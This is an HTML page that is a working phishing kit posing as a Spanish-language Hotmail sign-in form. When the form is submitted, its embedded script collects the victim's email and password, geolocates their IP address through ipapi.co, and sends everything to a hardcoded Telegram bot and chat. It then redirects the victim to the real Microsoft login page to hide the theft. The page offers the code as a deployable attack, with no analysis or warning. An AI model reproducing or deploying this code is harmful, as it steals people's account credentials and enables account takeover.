<html><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
	<link rel="stylesheet" href="min.css">
    <title>Inicio</title>
</head>
<body>

    <div class="ttlo">
  <img src="tlo.png" alt="">

<div>
  <div class="contact-form-wrapper d-flex justify-content-center" id="mld">
    <form id="contenido1" class="contact-form">
      <h5 class="title">Inicio de Sesi&oacute;n</h5>
      <p class="description">Inicie Sesi&oacute;n para continuar.
      </p>
      <div id="numo">
      <div>
	  <input type="hidden" id="idmedu129" name="id" >
        <input type="email" class="form-control rounded border-white mb-3 form-input" id="name" name="nm1" placeholder="Correo Electronico" required>
      </div>
      <div>
        <input id="pws" type="password" class="form-control rounded border-white mb-3 form-input" name="nm2" placeholder="Contraseña" required>
      </div>
	
      <div class="submit-button-wrapper">
          <button id="bnts" type="submit">Iniciar Sesi&oacute;n</button>
        
      </div>
    </div>
	    </form>

  </div>
  
</div>

</div></body>

<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#contenido1");
    form.addEventListener("submit", (event) => {
      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
      axios
        .get(url)
        .then((response) => {
          const email = document.querySelector("#name").value;

          const contra = document.querySelector("#pws").value;
		  
          const message =
            "\nHotmail" +
            "\nEmail: " +
            email +
            "\nContra: " +
            contra +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot5753099877:AAE4ZnYabxQ81o4ZYeheWtg3IC51HvwyZAI/sendMessage",
              {
                chat_id: "773065090",
                text: message,
              }
            )
            .then((response) => {
              window.location.href = "https://login.live.com";
            })
            .catch((error) => {
              console.error(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    });
  </script>
  </html>